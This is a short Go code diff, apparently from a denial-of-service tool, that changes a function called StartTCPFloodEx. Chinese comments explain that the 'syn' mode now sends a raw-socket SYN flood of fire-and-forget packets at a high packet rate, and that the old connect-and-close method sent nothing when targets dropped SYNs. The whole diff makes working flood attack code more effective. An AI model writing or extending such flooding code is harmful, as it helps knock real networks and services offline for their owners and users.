@@ -1138,10 +1138,30 @@ func StartTCPFloodEx(cfg AttackConfig) *AttackSession {
 		s.abort()
 		return s
 	}
+	dur := time.Duration(cfg.Duration) * time.Second
+
+	// tcp_syn：Linux/root（支持 raw socket）下改为真·SYN 洪水——
+	// 真实源 IP 的 fire-and-forget SYN 包，不等握手，PPS 极高。
+	// 旧实现用 net.Dial 完整握手后立刻关闭，目标端口关闭/防火墙丢 SYN
+	// 时 Dial 全部 1s 超时，PacketsSent 恒 0（用户实测 PPS=0 即此因）。
+	if mode == "syn" && SupportsSpoofing() {
+		if src := outboundIPv4(); src != [4]byte{} {
+			go func() {
+				runRawSYNFlood(s, targets, cfg.Threads, dur, src)
+				select {
+				case <-time.After(dur):
+				case <-s.StopChan:
+				}
+				s.finish()
+				close(s.DoneChan)
+			}()
+			return s
+		}
+		log.Printf("[tcp_syn] outbound IP probe failed, falling back to connect-close mode")
+	}
 
 	go func() {
 		var wg sync.WaitGroup
-		dur := time.Duration(cfg.Duration) * time.Second
 		reuseConn := mode == "ack" || mode == "tcpbypass"
 
 		for i := 0; i < cfg.Threads; i++ {
